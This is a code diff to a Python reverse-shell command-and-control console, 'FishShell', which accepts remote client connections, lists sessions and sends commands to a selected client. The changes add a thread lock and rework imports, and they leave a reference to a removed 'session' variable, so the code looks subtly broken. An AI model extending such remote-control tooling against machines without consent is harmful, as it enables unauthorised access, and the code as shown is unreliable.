@@ -11,7 +11,7 @@ from sources.functions.help import help_menu
 import sources.functions.var.globals as g
 from sources.functions.banner import banner
 from sources.functions.generate import generate
-import sources.functions.session as s
+from sources.functions.session import rev_shell, ses, command, cm
 from sources.functions.session import send_command
 
 
@@ -79,20 +79,20 @@ def accept_connections():
             when = datetime.now()
             g.all_conns[Id] = [client, addr, platform, when, None, 'Active']
             g.active_conns[Id] = [client, addr, platform, when, None]
-            print('\n')
-            print("[Info] New Connection!")
-            print(f"[Info] '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'\n")
-            if session is not None:
-                print(session, end='')
-            elif s.rev_shell is not None:
-                print(rev_shell, end='')
-            else:
-                print("FishShell >>> ", end='')
+            with lock:
+                print('\n')
+                print("[Info] New Connection!")
+                print(f"[Info] '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'\n")
+                if ses is not None:
+                    print(session, end='', flush=True)
+                elif rev_shell is not None:
+                    print(rev_shell, end='', flush=True)
+                else:
+                    print("FishShell >>> ", end='', flush=True)
         except Exception as error:
             if not g.till and g.accept:
-                title = "Error While accepting Connections"
-                msg = str(error)
-                notify(title=title, message=msg)
+                print("Error While accepting Connections")
+
     return
 
 
@@ -204,7 +204,6 @@ def list_active_connections():
 
 
 def select_client(Id):
-    global session
     if Id in g.active_conns:
         try:
             client = g.active_conns[Id][0]
@@ -213,7 +212,6 @@ def select_client(Id):
             print(f"Joined session of [{addr[0]}:{addr[1]}]")
             print()
             client.send(b'start')
-            session = f"Session [{Id}] >>> "
             send_command(client=client, Id=Id)
         except sock.timeout:
             print()
@@ -280,6 +278,7 @@ def quit_shell():
 
 
 def shell():
+    global cmnd
     while not g.till:
         try:
             print()
@@ -391,8 +390,8 @@ def shell():
 
 
 def main():
-    global session
-    session = None
+    global lock
+    lock = threading.Lock()
     g.initialize()
     g.all_conns = {}
     g.active_conns = {}
